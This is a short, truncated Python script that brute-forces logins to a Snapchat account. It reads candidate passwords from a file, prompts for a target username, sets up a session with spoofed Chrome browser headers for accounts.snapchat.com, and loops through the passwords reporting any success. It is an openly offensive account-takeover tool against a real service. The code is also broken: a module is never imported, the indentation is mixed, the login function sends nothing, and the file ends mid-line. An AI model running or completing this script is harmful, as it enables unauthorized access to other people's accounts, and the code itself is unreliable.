import requests


filename = 'pass.txt'
if os.path.isfile(filename):
	with open(filename) as f:
	    passwords = f.read().splitlines()
	    if (len(passwords) > 0):
	    	print ('%s Passwords loads successfully' % len(passwords))
else:
	print ('Please create passwords file (pass.txt)')
	exit()



req = ('https://accounts.snapchat.com/accounts/login?client_id=geo')
username = input('Enter Username ==> : ')


def Login(username,password):
	sess = requests.Session()
        sess.headers.update({
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'accept-encoding': 'gzip, deflate, br',
        'accept-language': 'en-US,en;q=0.9,ar;q=0.8,ar-SA;q=0.7',
        'cache-control': 'max-age=0',
        'content-length': '2398',
        'content-type': 'application/x-www-form-urlencoded',
        'authority': 'accounts.snapchat.com',
        'origin': 'https://accounts.snapchat.com',
        'referer': 'https://accounts.snapchat.com/',
        'sec-ch-ua': '"Google Chrome";v="89", "Chromium";v="89", ";Not A Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537',


        })



for i in range(len(passwords)):
	password = passwords[i]
	sess = Login(username,password)
	if (sess):
		print ('Login success %s' % [username,password
